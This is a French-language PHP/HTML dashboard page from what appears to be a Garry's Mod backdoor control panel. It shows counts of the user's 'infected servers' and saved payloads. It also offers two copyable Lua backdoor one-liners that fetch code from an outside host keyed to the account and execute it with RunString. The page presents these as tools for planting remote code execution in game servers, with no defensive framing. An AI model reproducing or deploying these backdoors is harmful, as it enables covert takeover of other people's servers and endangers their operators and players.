<?php

if (Account::isAuthentified()) {
$userscount = $GLOBALS['DB']->Count('users');
$usern = Account::GetUsername();
$svowncn = Account::GetKey();
$servercount = $GLOBALS['DB']->Count('server_list', ["server_owner" => $svowncn]);
$payloadcount = $GLOBALS['DB']->Count('payload', ["payload_owner" => $usern]);
?>
<div id="dashboard" class="tab-pane fade in active">
<div class="row">
                    <div class="col-lg-4 col-sm-6 col-xs-12">
                        <div class="white-box analytics-info">
                            <h3 class="box-title">Vos Serveurs inféctés</h3>
                            <ul class="list-inline two-part">
                                <li>
                                    <div id="sparklinedash"><canvas width="67" height="30" style="display: inline-block; width: 67px; height: 30px; vertical-align: top;"></canvas></div>
                                </li>
                                <li class="text-right"><i class="ti-arrow-up text-success"></i> <span class="counter text-success"><?php echo $servercount;?></span></li>
                                <li class="text-left" style="font-size: 1.5rem!important;"><i><font size="2">(ACTIF OU NON)</font></i></li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-lg-4 col-sm-6 col-xs-12">
                        <div class="white-box analytics-info">
                            <h3 class="box-title">Vos Payloads enregistrés.</h3>
                            <ul class="list-inline two-part">
                                <li>
                                    <div id="sparklinedash2"><canvas width="67" height="30" style="display: inline-block; width: 67px; height: 30px; vertical-align: top;"></canvas></div>
                                </li>
                                <li class="text-right"><i class="ti-arrow-up text-purple"></i> <span class="counter text-purple"><?php echo $payloadcount;?></span></li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-lg-4 col-sm-6 col-xs-12">
                        <div class="white-box analytics-info">
                            <h3 class="box-title">Utilisateurs</h3>
                            <ul class="list-inline two-part">
                                <li>
                                    <div id="sparklinedash3"><canvas width="67" height="30" style="display: inline-block; width: 67px; height: 30px; vertical-align: top;"></canvas></div>
                                </li>
                                <li class="text-right"><i class="ti-arrow-up text-info"></i> <span class="counter text-info"><?php echo $userscount;?></span></li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-xs-12">
                    	<div class="white-box">
                    		<h3 class="box-title">Backdoors</h3>
                    		<div class="modal-body">
            <p>
              Backdoor côté serveur (fichier.lua) :
            </p>
            <div class="form-group">
              <input type="text" style="filter: blur(5px);" class="form-control" id="bd" value="timer.Simple(1, function() http.Fetch(&#34;https://kpanel.cz/backdoor/yay1.php?key=<?php echo Account::GetKey(); ?>&#34;,function(b,l,h,c)RunString(b)end,nil) end)" readonly="">
            </div>
             <p>
              Backdoor luarun :
            </p>
            <div class="form-group">
              <input type="text" style="filter: blur(5px);" class="form-control" id="bd2" value="http.Fetch(&#34;https://kpanel.cz/backdoor/yay1.php?key=<?php echo Account::GetKey(); ?>&#34;,function(b,l,h,c)RunString(b)end,nil)" readonly="">
            </div>
            <i><small>Il est interdit de se rendre sur le(s) lien(s).</small></i>
          </div>
          <button id="thebtn" class="btn btn-danger" onclick="reveal()">Révéler les liens.</button>
          <button id="thebtn2" class="btn btn-success" onclick="hide()" style="display: none;">Cacher les liens.</button>
                    	</div>
                    </div>
                </div>

<div class="modal fade" id="discord-modal" tabindex="-1" role="dialog">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
        <h4 class="modal-title">Discord</h4>
      </div>
      <div class="modal-body" id="discord-body">
          <div class="form-group">
            <iframe src="https://canary.discordapp.com/widget?id=647516047124987925&theme=dark" width="350" height="500" allowtransparency="true" frameborder="0"></iframe>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-danger" data-dismiss="modal">Fermé</button>
      </div>
    </div>
  </div>
</div>
</div>
</div>

<script>
function reveal()
{
    $("#bd").css("filter", "blur(0px)");
    $("#bd2").css("filter", "blur(0px)");
    $("#bd3").css("filter", "blur(0px)");
    $("#thebtn").css("display", "none");
    $("#thebtn2").css("display", "block");
}
function hide()
{
    $("#bd").css("filter", "blur(5px)");
    $("#bd2").css("filter", "blur(5px)");
    $("#bd3").css("filter", "blur(5px)");
    $("#thebtn2").css("display", "none");
    $("#thebtn").css("display", "block");
}
$("#discord-modal").modal("show");
</script>

<?php } ?>